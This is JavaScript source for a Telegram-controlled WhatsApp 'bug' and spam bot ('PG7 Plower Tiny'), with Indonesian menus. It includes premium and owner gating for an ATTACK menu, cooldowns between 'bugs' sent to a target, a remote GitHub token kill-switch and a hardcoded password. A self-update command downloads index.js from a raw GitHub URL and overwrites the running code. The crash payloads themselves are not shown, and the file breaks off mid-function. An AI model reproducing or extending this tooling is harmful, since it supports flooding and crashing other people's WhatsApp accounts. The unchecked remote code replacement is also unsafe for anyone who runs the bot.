// -------------- BASE BY : @gaxx4u ------- \\
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const readline = require("readline");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const { TOKEN_BOT, CHANNELS } = require("./settings/config");
const ONLY_FILE = "./database/gconly.json"
const crypto = require("crypto");
const premiumFile = "./database/premium.json";
const GROUP_LOG_FILE = "./database/group_log.json";
const CMD_FILE = "./database/blcmd.json";
const SESSION_LOGIN = "./database/login.json";
const adminFile = "./database/admin.json";
const premiumGroupsFile = "./database/premiumGroups.json";
const ownerFile = "./database/owner.json";
const verifiedUsersFile = "./database/verifiedUsers.json";
const sessionPath = './xevorzsession';
const Module = require('module');
const vm = require('vm');
const fetch = require('node-fetch');
const originalRequire = Module.prototype.require;
let bots = [];

const userCooldown = new Map();

const bot = new Telegraf(TOKEN_BOT);


bot.use(session());



let sock = null;
let isWhatsAppConnected = false;
let lastPairingMessage = null;
let linkedWhatsAppNumber = "";
const usePairingCode = true;

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
  
  
// -- uptime ///
function formatUptime() {
  const uptime = process.uptime();

  const days = Math.floor(uptime / 86400);
  const hours = Math.floor((uptime % 86400) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}
// -- ram ----//
function formatRAM() {
  const os = require("os");
  const total = os.totalmem();
  const free = os.freemem();
  const used = total - free;

  const percent = ((used / total) * 100).toFixed(1);

  const toGB = (bytes) => (bytes / 1024 / 1024 / 1024).toFixed(2);

  return `${toGB(used)} / ${toGB(total)} GB (${percent}%)`;
}
// ~ Runtime ~ \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Days, ${hours} Hours, ${minutes} Minutes, ${secs} Seconds`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}
///~~~~ Sve ~~~~~~\\\
let verifiedUsers = new Set();
if (fs.existsSync(verifiedUsersFile)) {
  try {
    const data = JSON.parse(fs.readFileSync(verifiedUsersFile, "utf8"));
    verifiedUsers = new Set(data);
  } catch (e) {
    console.log("❌ Gagal load verifiedUsers");
  }
}


function saveVerifiedUsers() {
  fs.writeFileSync(verifiedUsersFile, JSON.stringify([...verifiedUsers], null, 2));
}
// ~ Coldown ~ \\
const cooldownFile = './assets/cooldown.json'
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ jeda bug ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

// ~ Function Test Func ~ \\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
/// Detect ///
async function detectPV(ctx, command, target) {
  const OWNER_IDS = loadOwner();

  if (ctx.chat.type !== "private") return;

  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  const userId = ctx.from.id;

  const notif = `
🚨 ☇ PERINGATAN BOT DI CHAT PRIVATE

👤 Nama : ${ctx.from.first_name}
📛 Username : ${username}
🆔 ID : \`${userId}\`

🎯 Target : ${target}
📦 Type : ${command}
  `;

  for (let owner of OWNER_IDS) {
    try {
      await ctx.telegram.sendMessage(owner, notif, { parse_mode: "Markdown" });
    } catch {}
  }
}
// ~ Formated Date ~ \\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

// ~ Ensure Database ~ \\
function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

// ~ Raw Github & Pasword ~ \\
const PANEL_PASSWORD = "GALAXY-13";

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/tesgmail8-dot/gaxTzy/main/token.json";

function askPassword() {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });

    rl.question("", (input) => {
      rl.close();
      resolve(input);
    });
  });
}

async function checkPassword() {
  if (isLoggedIn()) {
    console.log("");
    return true;
  }

  const input = await askPassword();

  if (input !== PANEL_PASSWORD) {
    console.log("");
    return false;
  }

  console.log("");
  saveLogin();

  return true;
}

async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log("❌ Token tidak ditemukan di database...");
    return false;
  }

  if (!validTokens.includes(TOKEN_BOT)) {
    console.log("");
    return false;
  }

  console.log("");
  return true;
}

function startBot() {
  console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀
╭───────□□□■■■────────────╮
│𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 1.0
│𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : @gaxx4u
╰───────■■■□□□────────────╯`))
}

validateToken()
// ~ Function Connect Whatsapp ~ \\
const WhatsAppConnect = async () => { 
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();
  const date = getCurrentDate();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
    getMessage: async (key) => ({
      conversation: "P",
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

        if (connection === 'open') {
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>⬡═―—⊱ 𝐏𝐆𝟕 ⊰―—═⬡</b></blockquote>  
⌑ proses : ${lastPairingMessage.phoneNumber}  
⌑ Code pairing : ${lastPairingMessage.pairingCode}  
⌑ note : ${date}`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        console.log(e)
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            console.log(chalk.bold.white(`
⌑ Author : @gaxx4u
⌑ version : 1.0
⌑ Full Updet : Script
⌑ Status : `) + chalk.green.bold('✅ WhatsApp terhubung'));
        }
      if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
        console.log(
        chalk.red('Koneksi WhatsApp terputus:'),
       shouldReconnect ? '🔄 Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                WhatsAppConnect();
      }
      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.replyWithHTML("<b>🪧 ☇ Tidak ada sender yang terhubung\n</b>");
    return;
  }
  next();
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};


const isSenderConnected = () => {
  return !!(
    sock &&
    sock.user &&
    sock.user.id
  );
};
// ~ Delete Session ~ \\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
//// Check Chanel////
async function checkChannel(ctx, next) {
  try {
    let joinedAll = true;

    for (const channel of CHANNELS) {
      try {
        const member = await ctx.telegram.getChatMember(channel.id, ctx.from.id);

        if (!["member", "administrator", "creator"].includes(member.status)) {
          joinedAll = false;
          break;
        }

      } catch (err) {
        console.log(`Channel ${channel.id} check error:`, err.message);
        joinedAll = false;
        break;
      }
    }

    if (joinedAll) {
      return next();
    }

  } catch (err) {
    console.log("Channel check utama:", err.message);
  }

  return ctx.reply(
`⛔ ᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴊᴏɪɴ sᴇᴍᴜᴀ ᴄʜᴀɴɴᴇʟ`,
{
  reply_markup: {
    inline_keyboard: [
      [
        { text: "📢 CHANNEL 1#", url: CHANNELS[0].link },
        { text: "📢 CHANNEL 2#", url: CHANNELS[1].link }
      ],
      [
        { text: "✅ VERIFIKASI", callback_data: "verify_user",
        style : 'primary' }
      ]
    ]
  }
});
}

bot.action("verify_user", async (ctx) => {
  try {
    let joinedAll = true;

    for (const channel of CHANNELS) {
      try {
        const member = await ctx.telegram.getChatMember(channel.id, ctx.from.id);

        if (!["member", "administrator", "creator"].includes(member.status)) {
          joinedAll = false;
          break;
        }

      } catch (err) {
        console.log(`Verify channel ${channel.id} error:`, err.message);
        joinedAll = false;
        break;
      }
    }

    if (joinedAll) {
      await ctx.answerCbQuery("✅ ☇ ᴠᴇʀɪғɪᴋᴀsɪ ʙᴇʀʜᴀsɪʟ");

      try {
        await ctx.deleteMessage();
      } catch {}

      return ctx.reply("✅ ☇ ᴛʀɪᴍᴀᴋsɪʜ sᴜᴅᴀʜ ᴊᴏɪɴ sᴇᴍᴜᴀ ᴄʜᴀɴɴᴇʟ\n");
    }

  } catch (err) {
    console.log("Verify error utama:", err.message);
  }

  return ctx.answerCbQuery("⛔ ☇ ᴊᴏɪɴ sᴇᴍᴜᴀ ᴄʜᴀɴɴᴇʟ ᴅᴜʟᴜ", {
    show_alert: true
  });
});
/// ~~~~ ///
function loadGroupLog() {
  try {
    if (!fs.existsSync(GROUP_LOG_FILE)) return [];
    return JSON.parse(fs.readFileSync(GROUP_LOG_FILE));
  } catch {
    return [];
  }
}

function saveGroupLog(data) {
  fs.writeFileSync(GROUP_LOG_FILE, JSON.stringify(data, null, 2));
}
/// ××××××× Bl cmd ××××××× ///
function loadCmd() {
  try {
    if (!fs.existsSync(CMD_FILE)) return [];
    return JSON.parse(fs.readFileSync(CMD_FILE));
  } catch {
    return [];
  }
}

function saveCmd(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// Kntl ///
function isLoggedIn() {
  return fs.existsSync(SESSION_LOGIN);
}

function saveLogin() {
  fs.writeFileSync(SESSION_LOGIN, "logged");
}

function logout() {
  if (fs.existsSync(SESSION_LOGIN)) {
    fs.unlinkSync(SESSION_LOGIN);
    console.log("✅ Logout berhasil!");
  }
}
/// ----- Flood ------ ///
function antiFlood(userId, delay = 2000) {
  const now = Date.now();
  const last = userCooldown.get(userId) || 0;

  if (now - last < delay) return false;

  userCooldown.set(userId, now);
  return true;
}
///// ~~~~~~ /////
let disabledCmd = loadCmd();
let antiCulik = true;
let groupLogs = loadGroupLog();
////=============================
function getPremiumGroups() {
  return loadPremiumGroups();
}

////=============================
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8"));
  } catch {
    return [];
  }
}

////=============================
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

////=============================
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}

////=============================
function isPremium(userId) {
  try {
    if (!fs.existsSync(premiumFile)) return false;
    const data = JSON.parse(fs.readFileSync(premiumFile, "utf8"));
    return data.includes(userId.toString());
  } catch {
    return false;
  }
}
// =============================
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8"));
  } catch {
    return [];
  }
}

// =============================
let owner = loadOwner();

// =============================
function isOwner(id) {
  return owner.includes(String(id)); 
}

// =============================
function addOwner(id) {
  id = String(id); 
  if (!owner.includes(id)) {
    owner.push(id);
    fs.writeFileSync(ownerFile, JSON.stringify(owner, null, 2));
  }
}
////=============================
function loadAdmin() {
  try {
    if (!fs.existsSync(adminFile)) return [];
    return JSON.parse(fs.readFileSync(adminFile, "utf8"));
  } catch {
    return [];
  }
}

////=============================
const checkOwner = (ctx, next) => {
  const ownerUsers = loadOwner();

  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithHTML(
      "<blockquote>Owner Access</blockquote>\n<b>❌ ☇ Akses hanya untuk owner</b>"
    );
  }
  return next();
};

////=============================
const checkOwnerOrAdmin = (ctx, next) => {
  const ownerUsers = loadOwner();
  const adminUsers = loadAdmin();

  if (
    !ownerUsers.includes(ctx.from.id.toString()) &&
    !adminUsers.includes(ctx.from.id.toString())
  ) {
    return ctx.replyWithHTML(
      "<blockquote>Access Denied</blockquote>\n<b>❌ ☇ Akses hanya untuk owner</b>"
    );
  }
  return next();
};

////=============================
const checkPremium = (ctx, next) => {
  const userId = ctx.from.id.toString();
  const groupId = ctx.chat?.id?.toString();

  let users = [];
  let groups = [];

  try {
    if (fs.existsSync(premiumFile)) {
      users = JSON.parse(fs.readFileSync(premiumFile, "utf8"));
    }

    if (fs.existsSync(premiumGroupsFile)) {
      groups = JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8"));
    }
  } catch {}

  if (users.includes(userId) || groups.includes(groupId)) {
    return next();
  }

  return ctx.replyWithHTML(
    "<blockquote>Premium Access</blockquote>\n<b>❌ ☇ Akses hanya untuk Premium</b>"
  );
};

////=============================
const savePremiumUsers = (users) => {
  fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

////=============================
const addAdmin = (userId) => {
  let adminUsers = loadAdmin();

  if (!adminUsers.includes(userId.toString())) {
    adminUsers.push(userId.toString());
    fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
  }
};

////=============================
const removeAdmin = (userId) => {
  let adminUsers = loadAdmin();

  adminUsers = adminUsers.filter((id) => id !== userId.toString());
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};
///========== Self/public 
let mode = "public"

// ===== MIDDLEWARE MODE =====
bot.use(async (ctx, next) => {
  if (mode === "self" && !isOwner(ctx.from.id)) {

   
    if (ctx.callbackQuery) {
      try {
        await ctx.answerCbQuery("🔒 ☇ BOT DI MATIKAN", { show_alert: true });
      } catch {}
      return
    }

   
    if (ctx.message) {
      return ctx.reply("🔒 ☇ BOT DI MATIKAN");
    }

    return
  }

  return next()
})
/// ×××× MIDLAWARe BL CMD ×××× ///
bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();

  const cmd = ctx.message.text.split(" ")[0].replace("/", "");

  
  if (isOwner(ctx.from.id)) return next();

  if (disabledCmd.includes(cmd)) {
    return ctx.reply(`🚫 ☇ Command /${cmd} sedang di blokir`);
  }

  return next();
});
///======== Menu utama ==========///
bot.start(async (ctx) => {

  const premium = isPremium(ctx.from.id)
  const sender = isSenderConnected()
  ? "ᴛᴇʀʜᴜʙᴜɴɢ"
  : "ᴛᴇʀᴘᴜᴛᴜs";

  const userId = ctx.from.id;
  const username = ctx.from.username ? "@" + ctx.from.username : "-";
  const name = ctx.from.first_name || "User";

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕  ⊰—═⬡</blockquote>
〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u
〣 ᴠᴇʀsɪᴏɴ : 1.0
〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
〣 ᴛʏᴘᴇ sᴄʀɪᴩᴛ : ʙᴇʙᴀs sᴩᴀᴍ
<blockquote>⬡═—⊱ INFORMATION ⊰—═⬡</blockquote>
〣 ᴜsᴇʀɴᴀᴍᴇ : ${username}
〣 ɪᴅ : ${userId}
<blockquote>⬡═—⊱ SECURITY ⊰—═⬡</blockquote>
〣 ᴛᴏᴋᴇɴ : ᴇɴᴀʙʟᴇᴅ
〣 sɪsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
<blockquote>⬡═—⊱ SENDER ⊰—═⬡</blockquote>
〣 ᴋᴏɴᴇᴋsɪ : ${sender}
`

  const keyboard = [
    [
      { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "xsettings",
      style : "danger" },
      { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs",
      style : "danger" }
    ],
    [
      { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
      style : "primary" }
    ],
    [
      { text: "༺𝐓𝐇𝐀𝐍𝐗 𝐓𝐎༻", callback_data: "xthanxto",
      style : "danger" },
      { text: "༺𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑༻", callback_data: "xdeveloper",
      style : "danger" }
    ],
    [
      { text: "༺𝐂𝐇𝐀𝐍𝐄𝐋༻", callback_data: "xchanel",
      style : "primary" },
      { text: "༺𝐌𝐀𝐑𝐆𝐀༻", callback_data: "xmarga",
      style : "primary" }
    ],
    [
      { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 ༻", callback_data: "xupdate",
      style : "danger" }
    ]
  ]

  await ctx.replyWithPhoto(
    { source: "./assets/gax4u.jpg" },
    {
      caption,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    }
  )

})

// ==================== THANX TO ==================== //
bot.action("xthanxto", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
🏆  T H A N X  T O  🏆

━━━━━━━━━━━━━━━━━━━━

👨‍💻 Developer  : @gaxx4u
🤝 Friend     : @gashima
💪 Support    : All Marga

━━━━━━━━━━━━━━━━━━━━

📜 Cerita Bot SC :

Bot ini lahir dari tangan dingin
@gaxx4u yang ngoding dari nol
sampe jadi bot yang kece gini.

Ditemenin oleh @gashima yang
selalu support dan gas ngasih
mood buat lanjut develop.

Dan tentunya semua anggota
Marga yang selalu setia nungguin
update dan pake bot ini.

Tanpa kalian semua, bot ini
nggak akan pernah ada.

Big Respect! 🫡🔥
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
            style : "danger" }
          ]
        ]
      }
    }
  );
});

// ==================== DEVELOPER ==================== //
bot.action("xdeveloper", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
👨‍💻  A B O U T  D E V  👨‍💻

━━━━━━━━━━━━━━━━━━━━

🆔 Username : @gaxx4u
🌟 Role     : Developer & Creator
🏷️ Status   : Active

━━━━━━━━━━━━━━━━━━━━

📖 Story About gax4u :

gax4u adalah seorang developer
yang berdedikasi tinggi dan punya
passion besar di dunia coding.

Beliau menciptakan bot ini dari
nol dengan kemampuan yang luar
biasa dan kreativitas tanpa batas.

Seorang yang pantang menyerah,
selalu pengen belajar hal baru,
dan nggak pernah puas sama
hasil yang udah dicapai.

Bot ini adalah bukti nyata
kerja keras dan ketekunannya.

Respect to @gaxx4u! 🫡🔥
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💬 CHAT DEVELOPER?", url: "https://t.me/gaxx4u" }
          ],
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
            style : "primary" }
          ]
        ]
      }
    }
  );
});

// ==================== CHANEL ==================== //
bot.action("xchanel", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
📢  C H A N N E L  L I S T  📢

━━━━━━━━━━━━━━━━━━━━

Bot ini punya 3 channel resmi :

1️⃣  @imgax4u
    Channel utama developer

2️⃣  @GalaxyOffcv1
    Channel update & info bot

3️⃣  @allstorfank
    Channel komunitas & story

━━━━━━━━━━━━━━━━━━━━

Jangan lupa join semua channel
buat dapet update terbaru dan
info penting seputar bot! 🔄
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📢 CHANEL 1", url: "https://t.me/imgax4u",
            style : "primary" },
            { text: "📢 CHANEL 2", url: "https://t.me/allstorfank",
            style : "danger" }
          ],
          [
            { text: "📢 CHANEL 3", url: "https://t.me/GalaxyOffcv1",
            style : "primary" }
          ],
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
            style : 'danger' }
          ]
        ]
      }
    }
  );
});

// ==================== MARGA ==================== //
bot.action("xmarga", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
🛡️  R U L E S  M A R G A  🛡️

━━━━━━━━━━━━━━━━━━━━

1️⃣  Wajib CN (Chat Nomor)
    Member wajib aktif chat

2️⃣  Patuhi Admin
    Apapun kata admin itu hukum

3️⃣  Setia
    Wajib setia kepada marga
    dan sesama member

4️⃣  Anti Maling
    Dilarang keras mencuri
    script, data, atau apapun
    milik marga!

5️⃣  No Drama
    Jangan bikin masalah di
    dalam maupun luar marga

6️⃣  Saling Menghargai
    Hormati sesama member
    marga, jangan toxic

7️⃣  No Bocil
    Bertingkah dewasa, jangan
    anak-anakan

8️⃣  Wajib Support
    Dukung terus development
    bot dan marga

━━━━━━━━━━━━━━━━━━━━

⚠️  Pelanggaran = Kick dari Marga!
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
            style : "primary" }
          ]
        ]
      }
    }
  );
});

// ==================== UPDATE SC ==================== //
bot.action("xupdate", checkOwner, async (ctx) => {
  await ctx.answerCbQuery();
  
  const repoRaw = "https://raw.githubusercontent.com/tesgmail8-dot/gaxTzy/main/index.js";

  const waitMsg = await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply("✅ Update Berhasil!\nSilakan restart bot di panel.");

    process.exit(1); // restart jika pakai PM2
  } catch (e) {
    console.log(e);
    await ctx.reply("❌ Update gagal. Pastikan repo dan file index.js tersedia.");
  }
});

// Command update juga bisa lewat text
bot.command("update", checkOwner, async (ctx) => {
  const repoRaw = "https://raw.githubusercontent.com/tesgmail8-dot/gaxTzy/main/index.js";

  const waitMsg = await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply("✅ Update berhasil!\nSilakan restart bot di panel.");

    process.exit(1); // restart jika pakai PM2
  } catch (e) {
